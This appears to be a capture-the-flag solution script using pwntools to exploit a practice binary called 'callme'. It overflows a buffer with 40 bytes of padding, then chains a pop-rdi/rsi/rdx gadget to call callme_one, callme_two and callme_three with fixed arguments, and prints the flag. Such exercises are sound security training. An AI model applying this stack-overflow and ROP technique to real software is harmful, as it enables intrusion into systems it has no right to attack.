#!/usr/bin/python
from pwn import *
import struct

elf = ELF('callme') 

# RDI -> 0x1 ; RSI -> 0x2 ; RDX -> 0x3
pad = 'A'*40
ropchain  = struct.pack('<Q', 0x401ab0) # 0x0000000000401ab0: pop rdi; pop rsi; pop rdx; ret; 
ropchain += struct.pack('<Q', 0x1)
ropchain += struct.pack('<Q', 0x2)
ropchain += struct.pack('<Q', 0x3)
ropchain += struct.pack('<Q', 0x401856) # 0x00401856  GLOBAL    FUNC callme_one@plt+6
ropchain += struct.pack('<Q', 0x401ab0) # 0x0000000000401ab0: pop rdi; pop rsi; pop rdx; ret;
ropchain += struct.pack('<Q', 0x1)
ropchain += struct.pack('<Q', 0x2)
ropchain += struct.pack('<Q', 0x3)
ropchain += struct.pack('<Q', 0x401876) # 0x00401876  GLOBAL    FUNC callme_two@plt+6
ropchain += struct.pack('<Q', 0x401ab0) # 0x0000000000401ab0: pop rdi; pop rsi; pop rdx; ret;
ropchain += struct.pack('<Q', 0x1)
ropchain += struct.pack('<Q', 0x2)
ropchain += struct.pack('<Q', 0x3)
ropchain += struct.pack('<Q', 0x401816) # 0x00401816  GLOBAL    FUNC callme_three@plt+6
exploit = pad + ropchain

io = process(elf.path)
io.recv()
io.sendline(exploit)

flag = io.recv()
success(flag)
